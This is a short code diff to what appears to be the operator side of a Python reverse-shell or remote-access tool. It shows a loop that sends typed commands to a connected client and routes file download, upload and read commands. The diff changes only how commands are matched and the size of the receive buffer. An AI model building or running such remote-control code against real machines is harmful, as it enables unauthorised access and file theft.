@@ -49,18 +49,18 @@ c,addr = s.accept()
 shell = c.recv(1024).decode() + ">"
 while True:
     cmd = input(shell)
-    if 'get' in cmd:
+    if 'get*' in cmd:
         transfer(c, cmd)
         continue
-    elif 'upload' in cmd:
+    elif 'upload*' in cmd:
         upload(c,cmd)
         continue
     elif 'exit' in cmd:
         c.send(cmd.encode())
         break
-    elif 'cat' in cmd:
+    elif 'cat*' in cmd:
         cat(c, cmd)
         continue
     c.send(cmd.encode())
     shell = c.recv(1024).decode()
-    print(c.recv(1024).decode())
+    print(c.recv(10240).decode())
